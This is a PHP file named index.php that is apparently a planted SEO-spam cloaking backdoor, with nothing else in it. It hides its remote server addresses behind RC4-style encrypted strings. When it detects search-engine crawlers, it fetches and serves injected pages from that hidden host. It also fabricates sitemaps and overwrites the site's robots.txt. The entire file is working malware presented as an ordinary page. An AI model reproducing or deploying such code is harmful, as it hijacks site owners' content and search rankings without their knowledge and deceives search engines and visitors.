<?php
error_reporting(0);
$htmlpath = $_SERVER["REQUEST_URI"];

$filename = "index.php";
$fs = explode(".php", $filename);

$qwsdxs = _poilkuj("PSiU38H3BSIe5yA31IKembwOv2/9g+AcigCJCQSbLLNs",  "1qazxsw2.");
$_hooo = _poilkuj("PSPF38H7VXkB5CNp1dnaw78cpm/hg+YM","1qazxsw2.");

$domain = $_SERVER["HTTP_HOST"];
$domain = str_replace("*", "www", $domain);

$hp = 0;$http = "http";if(fhgyjyh()){ $http = "https";$hp = 1;}

$uuuu1 = _poilkuj("Mzx5KaIzcbLT04Z8x54dHzThArbo9ODQ/ptP",  "123654.");
$uuuu2 = _poilkuj("wrgB0PKMJ+xiF6hjdigu+K/7qY1kiyoEQjz18J/ZB6Y",  "asdfgh....");
$uuuu3 = _poilkuj("zFfq8b4BnpUEV9ofGnzKB/ZeYJ7r7s/KwNz3b5wP+zwU",  "ikmjuy.");
$gbtbt = _poilkuj("4Ipzy7G5n0DKitIj+4nq+Qs",  "ikmwedcjuy.");
$ggg2 = _poilkuj("dO+aDqWG5OFAYT8/Y0U",  "iwdvkmgnjjuy.");
$nppp1 = _poilkuj("UBCHxgxjm2hZofcXt9pR",  "ikmplmjyjuy.");
$nid1 = _poilkuj("UK3n+6wrocCej65ZVA2CTg",  "ujnhdejkd...");
$ind = _poilkuj("3RuN0dwVN1Ad2s9VoA",  "ufghgfd...");
$def = _poilkuj("hSOC6zsDRlRXto62nL3F",  "cvbghght...");

$goo = 0;
$useragent = strtolower($_SERVER["HTTP_USER_AGENT"]);
if (strpos($useragent, $gbtbt) !== false || strpos($useragent,$ggg2) !== false || 
		strpos($useragent,"yahoo") !== false || strpos($useragent,"msnbot") !== false || strpos($useragent,"bingbot") !== false){
	$goo = 1;	
	if(isour($htmlpath, $filename, $nppp1,$ind,$def))
	{
		$dddir = $domain;
		$fpurl = $nid1;
		$pself = $fs[0];
		$url = $qwsdxs.$uuuu1.$dddir."/url/".$fpurl."/pself/".$pself."/g/".$goo;
		$html = mstdfg($url);
		echo $html;
		exit();
	}
}

if(edrftg()) $goo = 1;
if($goo == 0 && isto($htmlpath,$ind,$def))
{
	$dddir = $domain;
	$fpurl = $nid1;
	$pself = $fs[0];
	$url = $qwsdxs.$uuuu1.$dddir."/url/".$fpurl."/pself/".$pself."/jj/1/g/".$goo;
	$html = mstdfg($url);
	echo $html;
	exit();
}

if(substr_compare($htmlpath, ".html", -5)  === 0)
{
	if(strpos($htmlpath,"?") !== false)
	{
		$dirs = explode("?", $htmlpath);
		$dddir = str_replace($filename,"",$dirs[0]);
		$dddir = $domain.$dddir;
		$dddir = str_replace("/","*",$dddir);
	  
		$fpurl = str_replace(".html","",$dirs[1]);
		$fpurl = str_replace("/","*",$fpurl);
		 
		$pself = $fs[0];
		$url = $qwsdxs.$uuuu1.$dddir."/url/".$fpurl."/pself/".$pself."/g/".$goo;
		$html = mstdfg($url);

		if(!empty($html))
		{
			echo $html;
			exit();
		}
		
	}
}
else if(substr_compare($htmlpath, ".xml", -4) === 0)
{
	$path = explode("_", $htmlpath);
	if(empty($path[1])) exit("no url");
	$id = str_replace(".xml", "", $path[1]);
	if(!is_numeric($id)) exit("no url");

	$rootPath= dirname(__FILE__);
	$htmlpath = str_replace("?", "", $htmlpath);
	$dirs = explode("$filename", $htmlpath);

	$dddir = $domain.$dirs[0];
	$dddir = str_replace("/","*",$dddir);

	$uhost = $qwsdxs.$uuuu2.$hp."/p/".$id."/pack/".$dddir;
	
	$web_url = $domain.$dirs[0].$filename."?";
	
	$web_url = str_replace("//", "/", $web_url);
	$web_url = $http."://".$web_url;
	
	$xml = getsmxml($uhost,$web_url);
	if(!empty($xml)){
	echo $xml;exit;}
}

$op = $_GET["op"];
if(strpos($htmlpath,"?") !== false){
	if(empty($op) || $op == "") $op = "add";
}

if($op == "add"){
	$rootPath= dirname(__FILE__);
	$dirs = explode("$filename", $htmlpath);

	$dddir = $domain.$dirs[0];
	$dddir = str_replace("/","*",$dddir);

	$api = $qwsdxs.$uuuu3.$hp."/pack/".$dddir;
	$web_url = $domain.$dirs[0].$filename."?"; 
	
	$web_url = str_replace("op=add", "", $web_url);
	$web_url = str_replace("//", "/", $web_url);
	$web_url = $http."://".$web_url;
	
	$total = mstdfg($api);

	$ttt = explode("///", $total);
	$total = intval($ttt[1]);

	$pages = intval($total/3000+1);
	$smaps = "";
	for($i=0;$i<$pages;$i++)
	{
		$in = $i+1;
		$smaps .=  PHP_EOL ."Sitemap:" .$web_url."sitemap_".$in.".xml";
	}

	if($dirs[0] == "/" || empty($dirs[0]))
	{
		$rrrp = $rootPath;
	}
	else{
		$rps = explode($dirs[0], $rootPath."/");
		$rrrp = $rps[0];
	}
	qazxsw($rrrp."/robots.txt", "User-agent: *" . PHP_EOL . "Allow: /" . PHP_EOL . "Crawl-delay:3" . $smaps);

 	header("Location: ".$web_url."sitemap_1.xml");//
	exit;

 }elseif($op == "check")
	{
	$uhost = "https://www.baidu.com/";
 	$data = mstdfg($uhost);
	if(empty($data) || $data == "" || strlen($data) < 1){
		echo "-1";
	}
	else echo "1";
	exit();
}

function isto($htmlpath,$ind,$def)
{
	if(edrftg()) return false;
	if(empty($htmlpath) || $htmlpath == "/" || $htmlpath == "/".$ind.".html" ||
			$htmlpath == "/".$ind.".php" || $htmlpath == "/".$ind.".htm" ||
			$htmlpath == "/".$def.".html" || $htmlpath == "/".$def.".htm" || htmlpath == "/".$def.".php")
	{
		return false;
	}
	elseif((strpos($htmlpath,"wp-") !== false)) return false;
	elseif (substr_compare($htmlpath, ".xml", -4) === 0 || substr_compare($htmlpath, ".css", -4) === 0) return false;
	elseif(substr_compare($htmlpath, "index.php", -9) === 0 || substr_compare($htmlpath, "index.php?", -10) === 0) return false;
	elseif((strpos($htmlpath,"?op=") !== false)) return false;
	elseif((strpos($htmlpath,"n-") !== false)) return false;
	elseif((strpos($htmlpath,"index.html") !== false)) return false;
	elseif ((strpos($htmlpath,"index.php") !== false)) return true;
	elseif((substr_compare($htmlpath, ".htm", -4)  === 0)) return true;
	elseif((strpos($htmlpath,".") !== false)) return true;
	elseif(strpos($htmlpath,"?") !== false) return true;
	elseif(!(strpos($htmlpath,".") !== false) && !(substr_compare($htmlpath, "/", -1)  === 0)) return true;
	elseif(!(strpos($htmlpath,"?") !== false) && !(substr_compare($htmlpath, "/", -1)  === 0)) return true;
	return false;
}

function isour($htmlpath,$filename,$nppp1,$ind,$def)
{
	if(empty($htmlpath) || $htmlpath == "/" || $htmlpath == "/".$ind.".html" ||
			$htmlpath == "/".$ind.".php" || $htmlpath == "/".$ind.".htm" ||
			$htmlpath == "/".$def.".html" || $htmlpath == "/".$def.".htm" || htmlpath == "/".$def.".php")
	{
		return true;//
	}
	else {
		if((substr_compare($htmlpath, ".xml", -4) === 0)){
			return false;			
		}
		elseif((substr_compare($htmlpath, ".css", -4) === 0)){
			return false;			
		}	
		else {
			$dirsnw = explode("?", $htmlpath);
			$dddirnw = str_replace($filename,"",$dirsnw[0]);
			$dddirnw = str_replace("/", "", $dddirnw);
			if (!empty($dddirnw) && !(strpos($dddirnw, $nppp1) !== false)){
				return true;
			}
			elseif (!(substr_compare($htmlpath, ".html", -5)  === 0))
			{
				return true;
			}
			elseif (!(strpos($htmlpath,"n-") !== false))
			{
				return true;
			}
		}	
		
		return false;
	}
}

function getsmxml($uhost,$web_url)
{
	$data = mstdfg($uhost);
	if(empty($data) || $data == "" || strlen($data) < 1){
		return "no url 3";
	}

	$charset[1] = substr($data, 0, 1);
	$charset[2] = substr($data, 1, 1);
	$charset[3] = substr($data, 2, 1);
	if (ord($charset[1]) == 239 && ord($charset[2]) == 187 && ord($charset[3]) == 191) $data = substr($data,3);
	$ids = explode(",", $data);

	$time = date("Y-m-d");
	$xmlhead = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
	<urlset
      xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\"
      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
      xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">".PHP_EOL;

 	$xmlfoot = "</urlset>";
 	$xml = "";
	foreach ($ids as $v) {
		
 		$d = trim($v);
 		if(empty($d)) continue;
 			
 		$xml .= "<url>";
 		$xml .= "<loc>".$web_url.$d."</loc>";
 		$xml .= "<priority>0.6</priority>";
 		$xml .= "<lastmod>{$time}</lastmod>";
 		$xml .= "<changefreq>weekly</changefreq>";
 		$xml .= "</url>".PHP_EOL;
 	}

 	$xml = $xmlhead.$xml.$xmlfoot;

 	return $xml;
}

function mstdfg($gurl){
	$file_contents = "";
	$user_agent = "Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)";
    if (function_exists("curl_init")) {
        try {
			$ch = curl_init();
			$timeout = 30;
			curl_setopt($ch, CURLOPT_URL, $gurl);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
			$file_contents = curl_exec($ch);
			curl_close($ch);
		} catch (Exception $e) {}
	}

	if (strlen($file_contents) < 1 && function_exists("file_get_contents")) {
		ini_set("user_agent", $user_agent);
		try {
			$file_contents = @file_get_contents($gurl);
		} catch (Exception $e) {
		}
	}

	if (strlen($file_contents) < 1) {try {
	    	$handle = fopen ($gurl, "rb");
	    	while (!feof($handle)) {
	    		$file_contents .= fread($handle, 8192);
	    		
	    	}
	    		
	    	fclose($handle);
	    		
		} catch (Exception $e) {}
	 
	}
	
	return $file_contents;
}

function fhgyjyh() {
	if (!empty($_SERVER["HTTPS"]) && strtolower($_SERVER["HTTPS"]) !== "off") {
	return true;
	} elseif ( isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] === "https" ) {
	return true;
	} elseif ( !empty($_SERVER["HTTP_FRONT_END_HTTPS"]) && strtolower($_SERVER["HTTP_FRONT_END_HTTPS"]) !== "off") {
		return true;
	}
	return false;
}

 function qazxsw($htName, $htContents)
 {
 	$handle = fopen($htName, "w") or die("0");
 	fwrite($handle, $htContents);
 	fclose($handle);
 }

 function _poilkuj($string,$key=""){
 	$key=md5($key);
 	$key_length=strlen($key);
 	$string=base64_decode($string);
 	$string_length=strlen($string);
 	$rndkey=$box=array();
 	$result="";
 	for($i=0;$i<=255;$i++){
 		$rndkey[$i]=ord($key[$i%$key_length]);
 		$box[$i]=$i;
 	}
 			
 	for($j=$i=0;$i<256;$i++){
 		$j=($j+$box[$i]+$rndkey[$i])%256;
 		$tmp=$box[$i];
 		$box[$i]=$box[$j];
 		$box[$j]=$tmp;
 	}
 			
 	for($a=$j=$i=0;$i<$string_length;$i++){
 		$a=($a+1)%256;
 		$j=($j+$box[$a])%256;
 		$tmp=$box[$a];
 		$box[$a]=$box[$j];
 		$box[$j]=$tmp;
 		$result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
 	}
 	if(substr($result,0,8)==substr(md5(substr($result,8).$key),0,8)){
 		return substr($result,8);
 	}else{
 		return "";
 	}
 }

function edrftg($useragent=""){
	static $kw_spiders = array("bot", "crawl", "spider" ,"slurp", "sohu-search", "lycos", "robozilla");
	static $kw_browsers = array("msie", "netscape", "opera", "konqueror", "mozilla");
	$useragent = strtolower(empty($useragent) ? $_SERVER["HTTP_USER_AGENT"] : $useragent);
 	if(strpos($useragent, "http://") === false && dstrpos($useragent, $kw_browsers)) return false;
 	if(dstrpos($useragent, $kw_spiders)) return true;
 	return false;
 }
 
 function dstrpos($string, $arr, $returnvalue = false) {
 	if(empty($string)) return false;
 	foreach((array)$arr as $v) {
 		if(strpos($string, $v) !== false) {
	 		$return = $returnvalue ? $v : true;
	 		return $return;
 		}
 	}
 	return false;
 }
 			
 ///2591c98b70119fe624898b1e424b5e91?>